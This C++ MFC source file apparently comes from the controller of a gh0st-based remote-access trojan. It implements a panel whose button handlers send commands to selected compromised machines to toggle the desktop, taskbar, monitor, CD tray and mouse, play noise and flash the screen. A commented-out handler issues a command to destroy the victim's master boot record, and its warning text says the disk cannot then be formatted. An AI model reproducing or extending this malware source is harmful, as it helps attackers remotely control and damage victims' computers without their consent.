// Play.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "Play.h"
#include "PcView.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern CPcView* g_pConnectView;
/////////////////////////////////////////////////////////////////////////////
// CPlay

IMPLEMENT_DYNCREATE(CPlay, CFormView)

CPlay::CPlay()
	: CFormView(CPlay::IDD)
{
	//{{AFX_DATA_INIT(CPlay)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
}

CPlay::~CPlay()
{
}

void CPlay::DoDataExchange(CDataExchange* pDX)
{
	CFormView::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CPlay)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CPlay, CFormView)
	//{{AFX_MSG_MAP(CPlay)
	ON_BN_CLICKED(IDC_ZHUOMIAN1, Onzhuomian1)
	ON_BN_CLICKED(IDC_ZHUOMIAN2, Onzhuomian)
	ON_BN_CLICKED(IDC_RENWULAN, Onrenwulan)
	ON_BN_CLICKED(IDC_RENWULAN2, Onrenwulan2)
	ON_BN_CLICKED(IDC_XIANSHIQI, OnXianshiqi)
	ON_BN_CLICKED(IDC_GUANGQU, Onguangqu)
	ON_BN_CLICKED(IDC_ZAOYIN, Onzaoyin)
	ON_BN_CLICKED(IDC_SHANPING, Onshanping)
//	ON_BN_CLICKED(IDC_YINGPAN, OnKillmbr)
	ON_BN_CLICKED(IDC_GUANGQU2, Onguangqu2)
	ON_BN_CLICKED(IDC_XIANSHIQI2, OnXianshiqi2)
	ON_BN_CLICKED(IDC_MOUSE, OnMouse)
	ON_BN_CLICKED(IDC_MOUSE2, OnMouse2)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CPlay diagnostics

#ifdef _DEBUG
void CPlay::AssertValid() const
{
	CFormView::AssertValid();
}

void CPlay::Dump(CDumpContext& dc) const
{
	CFormView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CPlay message handlers

void CPlay::Onzhuomian1() 
{
	// TODO: Add your control notification handler code here
	BYTE	bToken = COMMAND_ZHUOMIAN1;
	g_pConnectView->SendSelectCommand(&bToken, sizeof(BYTE));	
}

void CPlay::Onzhuomian() 
{
	// TODO: Add your control notification handler code here
	BYTE	bToken = COMMAND_ZHUOMIAN;
	g_pConnectView->SendSelectCommand(&bToken, sizeof(BYTE));
}

void CPlay::Onrenwulan() 
{
	// TODO: Add your control notification handler code here
	BYTE	bToken = COMMAND_RENWULAN;
	g_pConnectView->SendSelectCommand(&bToken, sizeof(BYTE));
}

void CPlay::Onrenwulan2() 
{
	// TODO: Add your control notification handler code here
	BYTE	bToken = COMMAND_RENWULAN2;
	g_pConnectView->SendSelectCommand(&bToken, sizeof(BYTE));
}

void CPlay::OnXianshiqi() 
{
	// TODO: Add your control notification handler code here
	BYTE	bToken = COMMAND_XIANSHIQI;
	g_pConnectView->SendSelectCommand(&bToken, sizeof(BYTE));
}

void CPlay::Onguangqu() 
{
	// TODO: Add your control notification handler code here
	BYTE	bToken = COMMAND_GUANGQU;
	g_pConnectView->SendSelectCommand(&bToken, sizeof(BYTE));
}

void CPlay::Onzaoyin() 
{
	// TODO: Add your control notification handler code here
	BYTE	bToken = COMMAND_ZAOYIN;
	g_pConnectView->SendSelectCommand(&bToken, sizeof(BYTE));
}

void CPlay::Onshanping() 
{
	// TODO: Add your control notification handler code here
	BYTE	bToken = COMMAND_SHANPIN;
	g_pConnectView->SendSelectCommand(&bToken, sizeof(BYTE));
}
/*
void CPlay::OnKillmbr() 
{
	// TODO: Add your control notification handler code here
	if (MessageBox("硬盘加锁后将无法格式化，确定吗?", "警告", MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	BYTE	bToken = COMMAND_KILL_MBR;
	g_pConnectView->SendSelectCommand(&bToken, sizeof(BYTE));
}
*/
void CPlay::Onguangqu2() 
{
	// TODO: Add your control notification handler code here
	BYTE	bToken = COMMAND_GUANGQU2;
	g_pConnectView->SendSelectCommand(&bToken, sizeof(BYTE));	
}

void CPlay::OnXianshiqi2() 
{
	// TODO: Add your control notification handler code here
	BYTE	bToken = COMMAND_XIANSHIQI2;
	g_pConnectView->SendSelectCommand(&bToken, sizeof(BYTE));
}

void CPlay::OnMouse() 
{
	// TODO: Add your control notification handler code here
	BYTE	bToken = COMMAND_MOUSE;
	g_pConnectView->SendSelectCommand(&bToken, sizeof(BYTE));
}

void CPlay::OnMouse2() 
{
	// TODO: Add your control notification handler code here
	BYTE	bToken = COMMAND_MOUSE2;
	g_pConnectView->SendSelectCommand(&bToken, sizeof(BYTE));
}

